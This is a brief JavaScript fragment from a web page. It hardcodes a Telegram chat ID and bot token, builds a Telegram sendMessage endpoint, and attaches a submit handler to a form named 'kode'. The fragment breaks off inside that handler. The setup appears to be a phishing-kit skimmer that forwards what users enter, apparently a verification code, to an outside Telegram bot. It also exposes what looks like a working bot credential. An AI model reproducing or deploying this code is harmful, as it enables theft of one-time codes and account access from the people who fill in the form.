     $(document).ready(function() {
       ...
       const chat_id = '7709193105',
         botID = 'bot8105069628:AAHXgh0WPGwFgV4WB6LqeEiVA-KGRSMGmS0';

       const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

       document.querySelector('#kode').addEventListener("submit", async e => { // When the user submits the form
